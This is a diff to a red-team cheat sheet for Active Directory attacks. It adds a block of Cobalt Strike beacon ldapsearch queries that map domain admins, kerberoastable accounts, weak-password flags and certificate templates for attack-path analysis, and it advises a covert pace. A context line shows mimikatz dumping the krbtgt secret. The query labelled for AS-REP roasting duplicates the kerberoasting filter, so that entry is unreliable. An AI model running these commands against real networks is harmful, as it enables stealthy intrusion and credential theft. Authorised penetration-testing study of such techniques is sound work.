@@ -10,11 +10,9 @@ Compiled By : Nikhil Raj ( Twitter: [https://twitter.com/0xn1k5](https://twitter
 
 Modified By : An0nud4y ( Twitter: [https://twitter.com/an0nud4y](https://twitter.com/an0nud4y) | Blog: [https://an0nud4y.com](https://an0nud4y.com) )
 
-> **Disclaimer** : This cheat sheet has been compiled from multiple sources with the objective of aiding fellow pentesters and red teamers in their learning. The credit for all the tools and techniques belongs to their original authors. I have added a reference to the original source at the bottom of this document.
-> 
+Modified By : flux ( Twitter: [https://x.com/0xfluxsec](https://x.com/0xfluxsec) | Blog: [https://fluxsec.red/](https://fluxsec.red/) )
 
-> Access to my **CRTO** Notes is restricted due to Policy. If you are enrolled in CRTO ping me on discord (an0nud4y) or [https://an0nud4y.com](https://an0nud4y.com) to get my CRTO notes access.
-> 
+> **Disclaimer** : This cheat sheet has been compiled from multiple sources with the objective of aiding fellow pentesters and red teamers in their learning. The credit for all the tools and techniques belongs to their original authors. I have added a reference to the original source at the bottom of this document.
 
 ---
 # Table of Contents
@@ -655,6 +653,78 @@ beacon> mimikatz !lsadump::lsa /inject /name:krbtgt
 ```
 
 ### Domain Recon
+
+- Domain Recon using ldap search for BOFHound
+
+Use as necessary, covertly & low and slow is preferable.
+
+```powershell
+# For BOFHound, run the following query before bringing it into bloodhound (above the marker)
+ldapsearch "(objectClass=domain)" DC=TARGET,DC=DOMAIN
+ldapsearch "(schemaIDGUID=*)" name,schemaidguid -1 "" CN=Schema,CN=Configuration,DC=TARGET,DC=DOMAIN
+ldapsearch (name=ms-mcs-admpwd) name,schemaidguid 1 "" CN=Schema,CN=Configuration,DC=TARGET,DC=DOMAIN
+
+######## - marker - ########
+
+# Get Domain Controllers
+ldapsearch "(&(objectCategory=Computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))"
+
+# Get all Domain Admins
+ldapsearch "(&(objectCategory=group)(name=Domain Admins))"
+
+# Get Password Policy
+ldapsearch "(&(objectClass=msDS-PasswordSettings))"
+
+# Get specific user
+ldapsearch "(&(objectCategory=person)(objectClass=user)(samaccountname=TARGETUSERNAME))"
+
+# Get specific Computer
+ldapsearch "(&(objectCategory=Computer)(name=TARGETCOMPUTERNAME))"
+
+# Get all Groups
+ldapsearch "(&(objectClass=group))"
+
+# Get all active (not disabled) Users
+ldapsearch "(&(objectCategory=person)(objectClass=user)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))"
+
+# Get all active (not disabled) Computers
+ldapsearch "(&(objectCategory=Computer)(!userAccountControl:1.2.840.113556.1.4.803:=2))"
+
+# Get (not disabled) accounts with SPN set for kerberoasting
+ldapsearch "(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))"
+
+# Get (not disabled) accounts that do not require PREAUTH for asreproasting
+ldapsearch "(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))"
+
+# Get Windows Servers
+ldapsearch "(&(&(&(&(samAccountType=805306369)(!(primaryGroupId=516)))(objectCategory=computer)(operatingSystem=Windows Server*))))"
+
+# Get Users with passnotreq set
+ldapsearch "(&(objectCategory=Person)(objectClass=User)(userAccountControl:1.2.840.113556.1.4.803:=32))"
+
+# All users with Password Never Expires set
+ldapsearch "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))"
+
+# AD CS queries start ----------
+
+# Query the domain object
+ldapsearch (objectclass=domain) *,ntsecuritydescriptor
+
+# Query Enterprise CAs
+ldapsearch (objectclass=pKIEnrollmentService) *,ntsecuritydescriptor 0 3 "" "CN=Configuration,DC=domain,DC=local"
+
+# Query AIACAs, Root CAs and NTAuth Stores
+ldapsearch (objectclass=certificationAuthority) *,ntsecuritydescriptor 0 3 "" "CN=Configuration,DC=domain,DC=local"
+
+# Query Certificate Templates
+ldapsearch (objectclass=pKICertificateTemplate) *,ntsecuritydescriptor 0 3 "" "CN=Configuration,DC=domain,DC=local"
+
+# Query Issuance Policies
+ldapsearch (objectclass=msPKI-Enterprise-Oid) *,ntsecuritydescriptor 0 3 "" "CN=Configuration,DC=domain,DC=local"
+
+# AD CS queries end ----------
+
+```
 
 - Domain Recon using Power View
 
